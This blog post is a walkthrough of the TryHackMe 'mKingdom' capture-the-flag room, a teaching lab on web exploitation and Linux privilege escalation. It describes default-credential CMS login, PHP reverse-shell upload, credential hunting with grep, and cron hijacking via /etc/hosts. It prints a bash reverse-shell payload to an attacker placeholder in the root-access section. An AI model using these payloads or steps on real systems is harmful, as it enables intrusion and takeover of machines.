---
title: "THM: mKingdom"
date: 2025-03-04
categories: [CTF, Red Team]
tags: [CTF, Red Team]
permalink: /posts/ctf-mkingdom
image:
  path: /assets/img/thumbnails/ctf-mkingdom.png
---



### **Walkthrough**

#### **CTF Platform**: TryHackMe  
#### **Level**: Easy  

#### **Tools Used**:

- Nmap
- Gobuster
- Burp Suite
- RevShells
- LinPEAS
- Pspy64
- Python HTTP Server
- Netcat

#### **Resources Used:**:

- [Tryhackme](https://tryhackme.com/room/mkingdom)
- [Vulners - Concrete5 Exploit](https://vulners.com/hackerone/H1:768322)
- [RevShells Payload Generator](https://www.revshells.com/)
- [LinPEAS Script](https://linpeas.sh/)
- [Pspy64 Tool](https://github.com/wildkindcc/Exploitation/blob/master/00.PostExp_Linux/pspy/pspy64)
- [DarkReading - Common Default Passwords](https://www.darkreading.com/perimeter/top-10-admin-passwords-to-avoid)


## **Steps for the CTF**

---

### 1. Enumeration

#### NMAP:
The first step in any CTF is enumeration. Start by scanning the target machine using `nmap` to identify open ports and services running on them.

**Hint:** Use the following command to perform a detailed scan:
```bash
nmap -sC -sV -p- <TARGET_IP>
```

**Observation:** The scan results should reveal an open port hosting a web service.

#### WEB:
Access the web page hosted on the open port via a browser. You’ll notice a defaced page with no significant information in the source code.

**Next Steps:**
- Perform directory enumeration using tools like `gobuster`.
- Look for hidden directories or files that might provide clues.

**Hint:** Use the following command for directory enumeration:
```bash
gobuster dir -u http://<TARGET_IP>:<PORT> -w /path/to/wordlist.txt
```

**Discovery:**
- A `/app` directory contains a button redirecting to `/app/castle`.
- Manual inspection of the page reveals the CMS in use: "Concrete5" version 8.5.2.

**Research:** Look for exploits related to the identified CMS version. Pay attention to any requirements (e.g., admin login).

---

### 2. Exploitation

#### Accessing the CMS Admin Panel:
At the bottom of the webpage, you’ll find a link to the CMS login menu. Research default passwords for the CMS and attempt to log in.

**Hint:** Avoid brute-forcing as it may lead to IP blocking. Try common default credentials instead.

**After Logging In:**
- Modify the CMS settings to allow `.php` file uploads.
- Generate a reverse shell payload using [RevShells](https://www.revshells.com/) and upload it via the CMS file manager.
- Set up a listener on your attacking machine using `netcat`.

**Triggering the Payload:**
- Access the uploaded payload URL to execute the reverse shell.
- You should now have a shell as the `www-data` user.

---

### 3. Privilege Escalation

#### Enumerating Users:
Inspect the `/etc/passwd` file to identify potential users. Additionally, search for sensitive files such as database configuration files.

**Hint:** Look for files containing credentials. For example:
```bash
grep -ri "password" /var/www/html/
```

**Fixing the Terminal:**
To switch users, you’ll need an interactive terminal. Use the following commands to upgrade your reverse shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
export TERM=xterm-256color
```

**Switching Users:**
Use the discovered credentials to switch to another user account.

#### Using LinPEAS:
Run the `linpeas.sh` script to identify privilege escalation vectors. Host the script on your machine using a Python HTTP server and download it to the target machine.

**Hint:** Look for unusual environment variables or encoded strings in the output.

**Decoding Secrets:**
If you find a base64-encoded string, decode it to uncover potential passwords.

**Switching to Another User:**
Use the decoded password to switch to another user account.

---

### 4. Root Access

#### Monitoring Processes:
Use the `pspy64` tool to monitor running processes. Look for recurring tasks or scripts executed by privileged users.

**Hint:** Pay attention to scripts fetched via `curl`. If the domain resolves locally, you can manipulate the `/etc/hosts` file to redirect traffic to your attacking machine.

**Crafting a Malicious Script:**
Create a malicious script mimicking the original task’s structure and serve it using a Python HTTP server.

**Payload Example:**
```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

**Triggering the Task:**
Wait for the scheduled task to execute your malicious script. This should grant you a reverse shell as the root user.

---

### 5. Capturing Flags

Once you have root access, locate the flags on the system. Note that some flags may require specific commands to read.

**Hint:** Experiment with different commands (`head`, `tail`, etc.) if `cat` doesn’t work.
